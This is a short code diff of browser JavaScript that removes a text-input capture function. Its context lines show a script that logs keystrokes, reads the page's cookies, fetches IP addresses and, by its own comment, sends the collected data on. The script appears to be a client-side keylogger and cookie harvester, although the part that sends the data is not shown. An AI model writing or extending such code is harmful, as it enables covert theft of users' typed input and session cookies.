@@ -31,18 +31,6 @@
     console.log('Keys:', collectedData.keystrokes);
   }
 
-  function addTextInput() {
-    const input = document.createElement('input');
-    input.type = 'text';
-    input.placeholder = 'Enter some text';
-    input.id = 'textInput';
-    document.body.appendChild(input);
-
-    input.addEventListener('input', () => {
-      collectedData.textInput = input.value;
-    });
-  }
-
   function getCookie() {
     if (document.cookie.length > 0) {
       const cookies = document.cookie.split(';');
@@ -122,8 +110,6 @@
 
   collectedData.cookies = getCookie(); // Capture cookies
   console.log('Persisted Value:', collectedData.name);
-
-  addTextInput();
 
   // Fetch IP address and server IP address, and send data
   fetchIPAddress();
